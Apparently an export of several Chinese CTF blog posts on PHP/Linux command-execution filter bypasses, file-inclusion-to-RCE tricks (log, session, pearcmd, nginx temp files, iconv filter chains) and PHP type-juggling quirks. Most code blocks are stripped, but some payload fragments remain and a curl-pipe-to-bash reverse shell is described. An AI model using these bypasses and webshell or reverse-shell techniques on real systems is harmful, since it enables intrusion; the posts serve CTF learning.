利用rev: /bin/rev flag.php 无长度限制： 有长度限制，将#SHLVL换成##： 利用报错构造1： $&#123;HOME&#125; =&gt; /root 利用cp(已知一些可以访问到的文件) cp source_filename target_filename，将源文件复制到目标文件内，前提是你可以访问到目标文件 各种单双引号绕过： printf写shell： 利用00： 并不适用于php，因为php的system会自动检测00 利用八进制等绕过一些限制 例如NewStarCTF的一道题的payload: 利用八进制printf格式化输出然后sh反弹shell 通配符 * ：匹配全部，同时如果单独输入一个*则会获取ls的结果，然后将结果的第一个字符作为命令，其后作为参数执行 ?：匹配单个字符 [a-z0-9]：匹配小写a-z，0-9 还能取反[^b-z]g匹配a 例如香山杯2023的一个题的读flag就是more /[b-z]1[Z-b][b-z] &#123;&#125;：匹配大括号内的字符，例如cat /f&#123;l,s,t&#125;ag会匹配/flag、/fsag、/ftag，也可以在里面写..，&#123;a..c&#125;即匹配a-c 编码 最常见的肯定是base64 十六进制： 利用xxd -r -p进行hexdecode： printf配合前面的： 一些读文件的函数： Tips：如果将环境变量设置修改为了没有/bin的话，我们要执行命令需要添加/bin，如/bin/cat或者/bin/rev 例如putenv('PATH=/leran/linux/command'); 将环境变量修改了，此时我们需要添加/bin 读目录 nmap写入文件： 上文已经讲过escapeshellarg+escapeshellcmd+nmap的例子了 [nu1l junior] zako 这个题目感觉很有意思！ 这边配置一下docker起一个环境给大家看看 这里怎么绕这个request就不再讲述了 这里问题在于中间怎么隐藏了一行东西，这里提示我们要绕一下 这里可以直接查看execute.sh： 这是一个bash脚本，简单看下吧，再仔细看我也看不懂 reject大概就是一个拒绝的意思，说明这样不可以 这里有deny和allow，大概就是对应白名单和黑名单 然后检查一下你传进来的参数是否符合白名单和黑名单的要求，最后再eval执行 这里允许的命令只有： 禁止的黑名单有： 用ls看文件： 返回 当前目录只有这两个东西 ls /返回 ps: 这边原本是有个readflag的，为了方便我直接用flag了 那接下来的问题就是如何利用ls和grep获取到flag了 grep是可以读文件的 还有两个地方值得注意的： 这个源码缺了一部分，注释也在提示我们something hide here 仔细看system处执行的是将cmd直接拼接，如果利用ls';any cmd就可以造成命令注入rce了 我们如何获得源码呢？ 这个时候用grep读文件内容(题目也没限制空格)： 发现die了一下 所以这里有过滤 检查一下，不是grep，不是空格 也没有问题，说明问题出现在index.php上 grep &quot;&quot; *有问题，试试问号 获得了index.php的真正源码： 原来这里利用的是highlight_string显示的源码 并且利用grep -v排除了preg_match和highlight这一行 所以导致我们看不出过滤 接下来就是重头戏了 我们这边有符号的双重过滤，能用的只有一个grep，一个ls，那要怎么办呢？ 这边如果flag可以读的话，就直接出了： 但是实际题目中flag并不可读，而是需要执行/readflag 还记不记得grep跟cat差不多，而黑名单并没有ban掉&gt;&gt; 唯一能用的地方就只有index.php 如果我们能够将index.php变成这样就好了： 此时利用&gt;&gt;就能做到 也就是说，利用grep我们重新将index.php复制到一个新的php去，然后只保留一下部分(因为grep是查找整行)： 此时1.php就会变成这样： 这样我们的cmd就能够愉快的执行： "},{"title":"rce(上)","date":"2023-11-07T09:56:28.000Z","url":"/posts/49224.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"有关一些php和linux命令执行的知识 RCE PHP命令执行 eval assert 同eval php 7.2 前，assert是一个函数，可以使用可变函数调用 可变函数：如果一个变量名后面有圆括号，PHP将寻找与变量的值同名的函数，并且尝试执行它 php 7.2 后，assert与eval一样，不是函数而是语言构造器 create_function 具体可以看看php特性篇，讲述了create_function的注入 但是挺可惜的，create_function在php7之后就被移除了 WordPress &lt;= 4.6.1 的rce漏洞就是利用了create_function触发 如果没有的话我们也可以这么写： 如果是命令注入，无需调用，直接写： call_user_func/call_user_func_array call_user_func('a','b'); 相当于a(b); call_user_func_array，需要后面一个变成数组： 例如 array_walk array_walk(a, b) 其中a是数组，相当于调用b(a)： array_walk使用用户自定义函数对数组中的每个元素做回调处理 array_map array_map(a, b) 其中b是数组，相当于调用a(b)： array_map为数组的每个元素应用回调函数 array_filter array_filter(array $array[, callable $callback [, int $flag =0]]) array_filter()会用回调函数过滤数组中的单元，依次将array数组中的每个值传递到callback函数，如果该函数返回了true，则array的数组当前值会被包含在返回的结果数组中，数组的键名保留不变： 例如执行结果： 相当于调用b(a) array_reduce 用回调函数将数组化为单一的值，第一个参数是数组，第二个是回调函数： 例如： array_diff_ukey/array_diff_uassoc array_intersect_ukey/array_intersect_uassoc 同上 usort usort()函数将用户自定义的比较函数对一个数组中的值进行排序： ob_start() preg_replace /e模式 这个在之前的每日一题出现过： /e在php7已经不支持，php5.5已经弃用 可以执行第二个参数的内容，换句话说这里可以执行strtolower(&quot;\\\\1&quot;); payload: 一般来说是利用.*的，但是php的get此请求一般传不了. 所以我们改用\\S*来代替 换句话讲其实是： ${phpinfo()} 无参数的callback PHP函数 passthru、system 两个函数等效： exec/shell_exec 执行但不会回显，需要echo pcntl_exec popen popen打开一个指向进程的管道，该进程由派生给定的command命令执行 proc_open proc_open的例子： 其实就是执行一个命令，并且打开管道输入、输出内容 另一个来自php官方手册的例子： jacko神的题目： payload: `` 相当于shell_exec： escapeshellarg + escapeshellcmd 这里在我的飞书上出现过： 这里利用nmap 内容 -oG filename可以将内容写入到文件名内 这两个函数是不能调换使用顺序的 即不能够在escapeshellarg()后使用escapeshellcmd() 否则可能会造成一些单引号的闭合： 例如我有一个木马： 我要写入一下 经过escapeshellarg后： 经过escapeshellarg后再经过escapeshellcmd: 符合我们的预期 但是，如果我们的木马改成了： 此时经过escapeshellarg就会变成： 再经过escapeshellcmd： 处理一下就相当于变成了： 此时就相当于成功执行了一个shell 但是如果我们要写入的话： payload的话还需要加入前后的空格： 如果不加的话： 会变成： 导致后面写入错误 所以要加个空格 payload: file_put_contents写马 include 读文件 利用ctfshow命令执行的姿势： PHP 无参数rce 如果过滤了，可以利用： 读当前目录： 随机编码爆破： 当然还有rand 请求头传递参数 getallheaders();获取到所有的http报头 利用： 还可以 还可以: array_reverse()，反转数组 next，取数组的下一位 get_defined_vars() 类似无中生有： call_user_func： 利用反序列化写马： session_id: phpsession_id只允许数字和字母，利用hex2bin转换： PHP 无数字字母RCE 详见我的看看无数字字母RCE 简单看看无数字字母RCE | Err0r233 免杀(?) 利用strtr()将子字符串替换为给定的字符串 例如将Hello World替换为Hi Earth： 绕open_basedir 读目录： 当然，直接绕： 绕过 拼接： system(‘cat /flag’) 相当于 system(‘cat /f’.‘lag’); 单双引号拼接 chr函数拼接 eval的独特拼接：(sy.(st).em) 十六进制： 过滤括号，利用include等不需要括号的函数： 过滤了分号： 如果是eval函数的话，可以直接将;换成?&gt; 相当于短标签(?) include、assert、system都可以利用 有限制长度的rce 前置知识 在linux中，利用sh可以直接把文件当成sh脚本执行 利用php可以直接将文件作为php执行 CTF中字符长度限制下的命令执行 rce(7字符5字符4字符)汇总 利用的思路是通过写文件，然后利用ls -t将其全部写入一个文件中，最后执行sh： 7字符的rce 利用的思路其实是： 此时通过拆分，并且利用linux的\\可以接上换行的特性，可以将命令分解成： 由于php的原因，需要双写反斜杠 ls -t 是按时间倒序写入(越晚的写入越前面)，所以我们需要将其反过来这样写： 脚本执行： 5字符的rce BabyFirst Revenge 同样的思路，但是我们的ls -t&gt;a长度大于了5，我们此时需要将ls -t&gt;a也写入文件内(我们再写一个sh脚本即可) 5字符反弹shell 利用： 我们将反弹shell的语句放到vps上，然后让靶机curl我们的vps，利用curl ip|bash的方式执行: 然后vps监听port ls -t&gt;_的写入： 注：这里利用dir是因为dir能够自动补齐空格，方便我们的运算 反弹shell主体： 脚本： 直接rce 当然直接rce也是可以的，后面需要做更加多的拆分： 脚本实现: 4字符rce 在上面5字符的时候大概已经知道了*的作用： 在linux中，输入*会把第一个列出的文件名当作命令，然后把剩下的文件名当作参数 这就是为什么输入*v&gt;a的时候就会自动将v的内容倒序再写入 因为ls的时候 rev在v的前面 而*v会自动匹配rev 和 v 这就是4字符的rce的关键 直接贴exp了： SP: 数组绕过 来自鹏城杯2023X1r0z师傅的解法 这里将文件名限制在了3个字符以内，内容限制在了5个字符以内，更加的困难 这道题的正常解法大概是这样的： 还记得之前的几个特性吗？ sh文件能够将正常的文件当sh命令来执行 *能够匹配ls的结果，并且将ls的第一个文件作为指令，其余的文件名作为参数 所以这题的解法就是： 这样子的话第一步会生成一个sh的文件名，我们只需要其文件名 第二步会生成一个t的文件名(确保其ls之后在sh之后)，我们只需要其内容 第三步用w闭合前面的php，分号分割后利用*直接能够执行sh t 此时相当于执行nl /*，自然能读到flag 另外一种解法就是利用数组绕过长度限制，直接执行命令： 利用到php 123也会把123当作php脚本执行 反序列化内过滤[Oa]:[\\d]+问题 例如： 利用方式： 如果能用+的话直接用加号隔断 换别的方法： RCE后有脏数据 __HALT_COMPILER();能帮到你： __HALT_COMPILER();能够让编译器停止编译，当编译器执行到这就不用再执行__HALT_COMPILER();后面的部分了。通过提前停止编译达到了不解析脏数据，eval能够正常执行的，看demo： 利用方式： 它只是把$cmd的字母、下划线、括号置空，再用分号置换为aaa和aaa比较 相当于无参数RCE，问题在eval后的脏数据，我们利用__HALT_COMPILER();提前停止编译，就能除去Err0r23333333： 四处收集的题目 payload: 自己看吧，很好理解，相当于直接调用$blocked数组的file_get_contents 感觉不如直接无参数rce，看看后面有没有过滤getallheaders咯 甚至还可以sys$&#123;114514&#125;tem('head%09/flag'); 不知道是不是上面那个形式，总之就是可以直接卡bug"},{"title":"文件包含","date":"2023-11-07T09:52:32.000Z","url":"/posts/59563.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"有关文件包含的一些知识 文件包含 伪协议 直接利用php伪协议和data伪协议即可： data伪协议写shell: 换用不同的过滤器绕过 日志包含 常用日志路径： 这些日志会记录我们发包时的一些参数，例如user-agent等： 此时我们发包的时候修改我们的ua头，并且包含日志文件就会造成rce： session包含 先前的文章对session包含有一点简单的引入： 看看session.upload_progress | Err0r233 一些session文件的序列化/反序列化引擎： 利用原理 如果在php.ini中，session.auto_start=On的话，就算没有session_start()，php也会在接收请求后自动初始化session，但是该选项默认关闭 session.use_strict_mode的默认值为0，这使得用户可以自定义sessionid，此时cookie上会有Cookie: PHPSESSID=xxxx session.upload_progress.enabled如果设置为开启，则会使得我们每次上传一个文件时，php就会把这次文件上传的详细信息(时间、进度等)存储在session当中，例如 session.upload_progress.cleanup=on，表示文件上传结束后php会立刻清空session session.upload_progress.prefix=&quot;upload_progress_&quot;表示session中的前缀 session.upload_progress.name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;表示session中的键名的主值 一般包含session的路径：/tmp/sess_PHPSESSID 当然还有可能有其他的： 利用脚本 临时文件包含 和session差不多，都需要和时间竞争 php中如果我们上传一个文件，就会在/tmp下创建一个文件叫phpxxxxxx，其中xxxxxx是随机大小写字母或者数字，此时只需要不断上传匹配即可包含结果 Pearcmd Pear的全称是PHP Extension and Application Repository，路径为/usr/local/lib/php 利用原理 需要register_argc_argv设置为On，当然，在apache的docker环境中，这个条件是默认打开的，但是利用apt install php方式安装的php默认是关闭的 Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com) 上文的精简版大概的原理是先判断$argv是否为空，再尝试调用$_SERVER['argv']： 然后我们的$_SERVER['argv']我们是可控的： 我们可以利用+来进行命令的分割(控制$_SERVER['argv']) 而pear的程序实质上调用了pearcmd.php，也就是说我们可以通过pearcmd.php来利用pear命令的形式进行利用： 利用方式 利用config-create写文件： 然后利用包含包含写入的文件： 利用install下载外部shell文件 此时下载后保存的地址应该在： 这样可能会导致一些问题使得利用失败 所以一般利用下面这个姿势： 再利用包含即可 Tricks: phar伪协议+pearcmd包含 jacko神出的题目： 这里就可以利用pearcmd包含后在外部下载一个zip文件，然后利用phar触发： 这里利用%70直接绕过$_SERVER['REQUEST_URI'](详情见php特性篇) 然后利用phar： zip包内有个1，里面是shell的内容即可 当然也可以直接写： 直接省掉一个php nginx临时文件包含 利用原理 PHP如果是通过PHP-FPM和Nginx进行部署的时候，Nginx提供了一个容易被忽视的客服端正文缓冲功能(client body buffering) 模块ngx_http_core_module (nginx.org) client_body_buffer_size size; 这里设置了用于读取客户端请求正文的缓冲区大小 如果请求正文大于缓冲区，整个正文或者近期部分将写入临时文件内 同时，如果Nginx以PHP相同的用户身份运行时(www-data)，此功能会允许在没有任何其他创建文件的方式的情况下利用LFI 相关的linux代码： 尽管从上面可以看出一旦打开这个临时文件就会立马被unlink(删除)，我们仍能通过proc来获取对已删除文件的引用： 0xbb - PHP LFI with Nginx Assistance (bierbaumer.net) exp： 作者的结果： iconv 讲iconv前又得回到最开始的文件包含： 假设我们有一个文件叫1.txt，里面的内容就是&lt;?php phpinfo();的base64编码(PD9waHAgcGhwaW5mbygpOw==) 此时如果我们要包含利用的话就是这样写的： 此时include的函数实际包含的就是base64解码后的php代码 php的filter有一种convert.iconv的filter，可以用于字符集转换，例如下面这个： 此时可以看到我们生成了更多的字符，那么我们是否能够利用这些固定的内容转换之后产生webshell呢？ 尽管有时候转换会产生不可见的字符，结合base64-decode过滤器的特性，这些不可见字符也会被我们过滤掉 接下来整一个例子： 此时利用base64decode再解码一次就会去掉C前面的非法字符，但是也会乱码： 所以我们再encode一次即可恢复正常： 此时就会在前面多出了一个C 由此可知通过base64-decode再base64-encode可以使得payload变得干净。同理，二次base64的结果decode再decode也会变得干净 制造payload 如何构造webshell呢？ 首先&lt;是不能够直接构造的，但是我们可以利用上面的方法产生出一个含有php代码的字符串，最后再decode即可： payload: payload: 此时解码出来的内容是： 后面都是我们不需要的字符 此时已经成功获得shell了，直接包含即可 python的exp: 推广 实际上不止这点，可以通过下面的脚本构造任意字符 用法： 一个没有营养的利用 通过不断base64字符串x然后套decode使得最后的字符串只剩下x，利用： 自己测试吧，某比赛的结果，最后只留下它自己，就能够获取到flag了"},{"title":"简单看看无数字字母RCE","date":"2023-11-06T04:54:29.000Z","url":"/posts/47468.html","tags":[["RCE","/tags/RCE/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"这两天一直在看的玩意，原来我已经菜到啥也不会了，qwq。 简单引入 命令执行： 跑一个过滤字符的php看看能用啥字符 把数字和字母都过滤了，但是大多数符号是能够使用的，所以来看看这个要怎么绕过捏 1.url取反绕过（PHP7） 在PHP7中能够直接进行url取反绕过 结果如下 如果是PHP5的话需要多几步 2.汉字取反 Orz，这个多少带点离谱，通过对汉字取反得到想要的英文字符 参考大佬给出的生成器（雾），可以通过汉字跑出想要的英文字符 只需要修改$shell=''即可，例如assert就可以通过“极区区皮十勺”得到，POST可以通过“寸小欠立”得到 注意：assert在PHP7.0.12以上版本中已经不能够执行命令了（assert()内如果是字符串会当作php代码执行） 取反：~($var1{1}); 所以我们需要用符号构造出1，这里可以使用$_；使得变量的值变为1（i） 这就是执行的结果 3.异或 异或运算：比方5^Z 5的ASCII码是53，转成二进制是00110101，Z的ASCII码是90，转成二进制是01011010，二者异或会得到 01101111，转成字符串就是o 所以我们可以通过这个特性构造出我们想要的字符 接下来就是上大佬的脚本时间了： 所以assert可以通过 得到，注意反斜杠转义需要多加一个\\，即 _POST: 所以可以构造： 同样需要进行url编码 执行成功： 4.自增 运行一下，看看会得出什么？ 很神奇吧，会拼凑出A、B 解释一下：在Dest0g3-520迎新赛中有解释过 . 能够拼接变量，数组拼接字符串会显示Array（第一步） 第二步，截取A A++ =&gt; B; B++=&gt;C…以此类推，可以得到A-Z所有字符，然后不断通过拼接，总能得到： 这里直接上一个题好了（ctfshow的） 同样的过滤了一堆符号，并且不能使用数字，英文字母（ 其实跑一下脚本看看能用什么更加直观： 基本上能用的只有符号，不过没有限制下划线，加号，中括号小括号和$ 然后提示是吃瓜杯的shellme，去看一下，wp是自增构造的 但是这题不能够用任何数字（虽然没多大影响） 只需要构造出A，就能够造出_GET，那就能够传参 只需要传参执行命令即可： 总体payload： 5.Post执行 通过Post一个文件使用#!/bin/sh命令并用.（点）执行这个文件，就可以执行命令 例如 同样经过测试 能用的字符只有： 只能通过一个字母p，但是没有过滤点号和反引号，所以可以使用Post传文件并且通过.执行sh命令 （文件上传后储存的位置在/tmp/php+6个随机字母） 借助一下： burp抓包然后修改一下就可，能够找到/flag.txt，直接cat /flag.txt 有时候也可以直接.+/???/???[@-[]执行，例如ctfshow web入门 55 (只要大小于号、反引号没被过滤基本上能用上面的payload) 而且这个好像只能适用于get传参执行的样子… （注：使用echo+反引号能够执行命令，?&gt;&lt;?=``也相当于echo+反引号） 最后附上过滤字符的php，根据题目的不同修改preg_match就好了（ 芜湖，结束了，摆烂摆烂，反正到时候也是啥都不会~ 6.补充 7.自增条件下的有限制长度的RCE 有时候对于自增会限制我们的payload长度，这个时候我们要怎么做呢？ 例如: 105字符内构造 这题在上面的基础上增加了strlen的限制，限制我们的payload长度在105个以内 此时我们如果利用之前的payload的话，长度肯定会超出限制 此时的话可以利用另外一种拼接方式： 利用_/_._;拼凑出之前的payload： 此时计算出来的长度为91，满足我们小于105的限制 84字符内构造： 还是这个题，将字符限制到84长度内又要怎么做呢？ 同样的，我们还是需要利用(_/_._)[_]获取到N，如果用A的话是绝对超出长度限制的 然后需要怎么样压缩长度呢？ 这里就需要考虑到php的运算顺序了： 输出的结果是什么呢？ 利用一些在线工具测试一下： 所以我们能够猜测到运算的顺序了： b先将后面的b先将后面的b先将后面的a拼接进去，变成$a.a 然后a++ 此时$a变为b 然后再将$a换成b 所以我们可以这样: 所以我们还能够缩短长度： 此时的payload为： 其长度为84，刚好符合 73字符内构造： 还能更短么？ 当然能： 其利用原理其实就是在最后一步构造时和前一步直接融合： 此时$_在中括号内被构成：_POST 所以最后的shell其实是： 非常绝妙的构造方法，其长度恰好为73 还要另外一种办法就是urlencode，利用不可见字符的构造： 参考资料： 无字母数字webshell总结 无字母数字webshell之提高篇 | 离别歌 (leavesongs.com) 无字母数字的命令执行(ctfshow web 入门 55) "},{"title":"php特性","date":"2023-11-02T05:31:15.000Z","url":"/posts/21053.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"有关php的一些特性 看看php特性 结合ctfshow的php特性篇使用效果更佳 前置知识 正则表达式： 元字符 含义描述 \\d 匹配任意一个十进制数字，等价于[0-9] \\D 匹配任意一个除十进制数字以外的字符，等价于**[^0-9]** \\s 匹配任意一个空白字符，等价于[\\f\\n\\r\\t\\v] \\S 匹配任意一个非空白字符，等价于**[^\\f\\n\\r\\t\\v]** \\w 匹配任意一个数字、字母或下划线，等价于[0-9a-zA-Z_] \\W 匹配除数字、字母或下划线外的任意一个字符，等价于**[^0-9a-zA-Z_]** ***** 匹配0次、一次或多次其前的原子 + 匹配1次或多次其前的原子 ? 匹配0次或者1次其前的原子 . 匹配除了换行以外的任意一个字符 | 匹配两个或多个分支选择 {n} 表示其前面的原子恰好出现n次 {n, } 表示前面的原子出现不少于n次 {n, m} 表示其前面的原子至少出现n次，至多出现m次 ^或\\A 匹配输入字符串的开始位置，或者是紧随一换行符之后 $或\\Z 匹配输入字符串的结束位置，或者是紧随一换行符之前 \\b 匹配单词的边界 \\B 匹配除单词边界以外的部分 [] 匹配方括号中指定的任意一个原子 [^] 匹配方括号中的原子除外的任意一个字符 0 匹配其整体为一个原子，即模式单元 模式修正符 模式修正符号 功能描述 i 在和模式进行匹配时不区分大小写 m 将字符串视作多行，默认正则的开始&quot;^“和结束”$“将目标字符串视作为单一的一行字符。如果在修饰符中加上&quot;m”，那么开始和结束将会指向字符串的每一行 s 此修正符会使得&quot;.&quot;匹配所有的字符，包括换行符。即将字符串视作为单行，换行符看作普通字符 x 模式中的空白忽略不计，除非被转义 e 只用在preg_replace()中，在替换字符串中将其作为php代码求值，并且用其代替的结果来替换所搜索的字符串 U 贪婪模式，最大限度匹配 D $只匹配目标字符串的结尾 正片 preg_match() preg_match()只能够处理字符串，当传入的值为数组时，会返回false 例如ctfshow web89: intval()函数成功时返回var的integer值，失败时返回0，而空的array返回0，非空的array返回1 但是preg_match匹配到数字就会进入no no no! 所以我们此时可以使用数组绕过preg_match()，同时利用intval()会对数组返回1的特性进行绕过： 通过换行绕过某些限制，在一些正则表达式不恰当的书写时可能便会产生，例如ctfshow web91： 这里需要我们传入的值为php，但是如果匹配到php就会返回hacker，似乎是一个矛盾的问题 但是仔细看发现这两个preg_match()的模式修正符似乎有些不一样 可以看到前面一个im能够匹配多行的字符串，但是后面一个只能匹配第一行。所以我们可以通过换行符%0a来进行绕过： 这样 im就会匹配到php，而i没有匹配到php，成功绕过 PHP为防止正则表达式的拒绝服务攻击，给pcre设定了回溯次数上限为100万次，如果超过了这个数，preg_match将会返回false 这里的话可以去参考p神的文章  他讲的十分地详细，包括整个正则表达式的匹配过程是如何匹配的： 比如说 所以说当这个过程重复超过100万次的话，preg_match()将会直接返回false，从而绕过preg_match限制 上面是基于.*的贪婪模式进行匹配的 而.+?这种非贪婪模式的匹配如下： 假设输入的是UNION/*aaaaa*/SELECT 例如ctfshow web130： 题目原意是利用php的pcre回溯次数限制来进行绕过preg_match： 如果我们输入aaactfshow的话 .+?首先匹配ctfshow前面的aaa中的第一个a，然后由c匹配a… 所以我们可以输入100万个a，然后后面加上ctfshow来绕过 但是这题也可以通过另一个方法来解决，就是直接输入 此时.+?ctfshow不会匹配ctfshow 这里可以自行去正则表达式在线工具进行测试 intval() 适用范围 经过本人测试，在PHP版本7.4下，下文中的intval($num) &lt;2023并且intval($num+1)&gt;2024失效，同样会将$num转换为科学计数法后的结果。 同理，我可能也不会再介绍sleep((int)$time)在的绕过，高版本下的php已经修复科学计数法的特性 要出题的话只能将PHP的版本降低来出 正片 官方文档解释中，intval是这样描述的： 对于intval函数的一些特性，都可以在下面的代码中看出来： 字符绕过 对于intval而言，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的字符串所表达的整数值。 也就是我们经常用到的数字加一个字母绕过： 科学计数法绕过 在intval中：有两种情况可以适用该方式绕过 第一种： 如果后面是intval($num, 0)的话，会有如下特性： 遇到字母便会停止读取 如果字符串使用0x前缀，使用16进制 如果以0开始，使用8进制，否则使用10进制 但是e可以表示科学计数法： 即可绕过，为什么呢？ 这里num和int型作比较，转换规律是遇到第一个字母时，将字母和其后面的内容省略，然后转换为int型进行比较 例如4476a会将a舍去，变为(int)4476，此时会die(no no no!) 但是e不一样，e是科学计数法，在进行比较时，4476e1相当于4476*10=44760，不等于(int)4476 但是遇到intval($num, 0)时，会舍弃掉e和后面的部分，变为4476 从而成功绕过 此处先讲特性1，后续两个特性会在下面讲到 第二种： 此时的话需要输入一个num使得intval(num)&lt;2022，但是其+1后的intval大于2023 此处便是科学计数法的妙用： 这样就能够使前面变为小于2022，但是后面大于2023了 进制绕过 如果后面是intval($num, 0)的话，会有如下特性： 遇到字母便会停止读取 如果字符串使用0x前缀，使用16进制 如果以0开始，使用8进制，否则使用10进制 接下来就是后两个的应用： 这里由于限制，我们无法输入字母了，而且num在类型转换后不能等于4476 这里我们便可以使用进制绕过，利用 010574 转换为10进制后为4476 小数点绕过： 前提是匹配的是字符型的4476: 这里输入4476.0即可绕过 因为intval(4476.0) = 4476， '4476.0'!='4476' 对于弱比较类型的绕过： 注意看!is_numeric这一行即可，利用a绕过!is_numeric 利用小数点，经过弱比较后会变为1024.1绕过$c!=1024 利用intval函数使得$c=1024 空格的妙用 这里把.过滤了，但是我们前面说了，0不能在第一位而已，而intval函数会将 %204476也看为数字 这里在前面加个空格，利用010574即可 strpos() 上文讲过strpos的绕过了： 利用%20、%0a、%2b都可以绕过 当然还有另一种，也就是我们数组的绕过： 举个例子： 由于strpos()无法处理数组，如果输入的是数组，便会返回null，而null自然不等于false md5() md5涉及到的一般有： MD5弱类型比较 MD5强类型比较 MD5碰撞 数据库 按顺序来讲： md5的弱类型比较 非常的简单的例子： 这里的话可以使用强类型比较的方式进行绕过，也可以利用弱类型比较的方式进行绕过 弱类型比较的意思就是，在遇到不同类型的比较时，例如字符串和数字 字符串会进行下列步骤： 如果字符串开头是字母，直接等于0 如果不为字母，则截止到遇到的第一个字母。例如132a会被保留为123 但是对于e来说，它在php内可以用作科学计数法。 例如var_dump('0e123456' == '0e23232323')会返回true 要想绕过弱比较，只需要找到md5后为0e开头的即可： 当然，第二种情况就是$a==md5($a) 这种就需要我们找到一个0e开头的字符串，其md5后的值也是0e开头的： md5强类型比较： 换成了===，这个时候就会比较类型了，但是这个强等于还是可以通过数组进行绕过： 当md5传入数组时，md5无法求出array的md5的值，所以会导致任意两个array的md5值都相等 当然，弱类型比较也是可以用数组绕过去的，我推荐用这种方法做两种类型的比较题 md5碰撞 在强类型比较上加了一点东西： 强制你要求传入的是string的时候，只能来寻找两个确实不一样，但是md5值是一样的string 当然，这点可以通过脚本来实现： Fastcoll.exe，用于快速生成两个md5值一样的不同字符串 使用方法： 此时生成两个txt文件，直接使用是不行的，我们还要对其进行urlencode: 我生成的两个字符串是这样的： 当然，网上还有比较常见的： 数据库 只需记住ffifdyop 因为有些数据库的查询语句是： 这个字符串进行md5之后转换为字符串的结果恰好是: 'or'6�]��!r,��b 相当于万能密码 Extra，其他加密算法的碰撞(例如md4、CRC32等)： 参考github: spaze/hashes：魔术哈希 – PHP 哈希“碰撞” (github.com) strcmp newstarctf的一个姿势，同样利用数组绕过即可 file_put_contents 向filename写入data 常用于写入一句话木马等操作 in_array() in_array用于搜索数组中是否存在这个元素： 简单的利用其实就是： 优先级关系 and、or、&amp;&amp;、||和= 看几个例子： 可以看出=的优先级关系比and和or都要高 而=的优先级关系比&amp;&amp;和||要低 所以我们可以利用其优先级关系来进行一些绕过： 看似需要我们写rce就不能够绕过is_numeric 但实际上由于=优先级大于and，我们其实只需要看$v0 = is_numeric($v1)即可，也就是令v1为任意数字(除了0)即可 GET和POST http协议的get优先级比较高，默认先以get方式获取数据，无论是哪种方式发起的，都先以GET方式有限，即用GET数据获取到的数据就不会用POST方式获取一遍，get方式获取不到的，再用POST方式获取 ReflectionClass反射类 反射类就是一个类的映射： 比如说一个类 我们php中正常实例化一个类是这样的： 所以，如果我们需要实例化News类的反射类是这样的： 通过ReflectionClass可以获取到这个类的详细信息，从而对类进行分析。 具体看下面这个例子： 下面是一些ReflectionClass的常用方法： 可以利用ReflectionMethod构建一个类的对象，具体方式： 利用invoke方法初始化了一个name为john的student对象 输出 john 如果不指定方法的话，就会输出很多的东西，但我们使用echo new ReflectionClass即可输出类内的内容 这里使用ReflectionClass获取类内容： call_user_func() 当然啦，提到命令执行，就不得不提到有关一些命令执行的函数。 我们比较熟悉的一般是eval、passthru、exec、shell_exec、system等 比较陌生的之前讲过一个，是proc_open 而这个call_user_func呢，也可以作为命令执行的函数 如果他有两个参数的话，就会相当于： 这个也是比较危险的函数 hex2bin() 将十六进制转化为字符串： 例如: 注意，hex2bin不能够输入0x的十六进制！ 直接输入0x后面部分即可 对于有些地方有奇效： hex2bin()命令执行 看看这个例子： blacklist过滤了很多，但是没有过滤hex2bin、单引号 利用hex2bin构造我们的命令： 将其转化为hex2bin的形式： 然后百度一下即可： payload: hex2bin()搭配file_put_contents 在is_numeric输入参数的情况下，需要我们写入shell获取flag的时候，可以利用hex2bin： 例如： payload: PHP伪协议 PHP伪协议的利用方式有两种，一种是读文件，而另一种就是写文件了。 读文件 我们比较常用的方法就是利用文件包含的方式来读文件： 例如： 最经典的就是文件包含一个get传参的参数了，直接打 如果过滤了base64，我们还可以换用其他的filter来进行读文件操作，或者直接不使用filter： 伪协议还能够支持多种编码方式： 写文件 配合file_put_contents可以将base64的内容解码后写入目标文件中： 拓展：侧信道+filter攻击 参考一下这位师傅的blog： Webの侧信道初步认识 | Boogiepop Doesn’t Laugh (boogipop.com) 常常利用于无回显的文件读取中，例如file函数 file函数可以利用php的filter伪协议 对于filterchain的攻击原理如下 PHP Filter链——基于oracle的文件读取攻击 - 先知社区 (aliyun.com) 省流的话：其实就是利用iconv的filter造成溢出，导致服务器返回500，然后根据dechunk的filter来确定第一个字符，再利用iconv将剩余的字符和第一个字符交换 利用脚本进行文件的读取即可 而实际上，这篇文章讲述的更加的清楚：  其受影响的函数如下： 对于其他函数的情况，上面的脚本似乎不能够实现了，但是还有个脚本能够利用： GitHub - synacktiv/php_filter_chains_oracle_exploit: A CLI to exploit parameters vulnerable to PHP filter chain error based oracle. is_file() is_file()判断是否为文件，利用php伪协议即可绕过，利用的是is_file判断伪协议为false，而highlight_file判断为文件： 还可以使用/proc/self/root绕过： 同样的道理，利用这个payload可以绕过require_once 原理可能是当require_once包含的软链接层数较多时，once的hash匹配会直接失效造成重复包含 sha1() 同md5，可以利用数组绕过、弱类型比较、sha1碰撞等方式： parse_url() 对于parse_url，有一期ctfshow的周末大挑战写的很清楚： parse_url会对传入的url进行语法分析，然后返回url的每个部分 如果parse_url带两个参数，则会获取结果的一部分： 例如parse_url('url',PHP_URL_SCHEME)只会返回SCHEME部分 第二个参数可选的值有 具体的例子如下： 当然，少了[fragment]=&gt;test，但是实际上还是会有这个的存在的fragment部分 具体的利用方式详见： ctfshow周末大挑战 - parseurl | Err0r233 如果需要post参数，需要添加引号： is_numeric() 这玩意的话，要绕过也不算绕过吧。。 编码成十六进制就能绕了，当然只能是0x....这种格式的 利用科学计数法： 传入0exxx即可绕过 绕过原理就是科学计数法 0e开头类型的转换成int后都是1 变量覆盖 